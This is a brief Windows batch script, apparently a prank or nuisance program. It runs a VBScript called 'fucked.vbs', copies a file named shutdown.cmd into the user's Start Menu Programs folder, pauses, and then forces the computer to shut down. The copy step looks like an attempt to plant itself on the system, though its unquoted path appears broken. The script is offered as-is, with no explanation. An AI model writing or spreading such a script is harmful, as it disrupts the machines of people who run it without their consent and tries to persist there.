@echo off

"fucked.vbs"
copy shutdown.cmd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
ping -n 10 127.0.0.1 > nul
shutdown.exe -s -t 05 -c "Shutdown"
exit
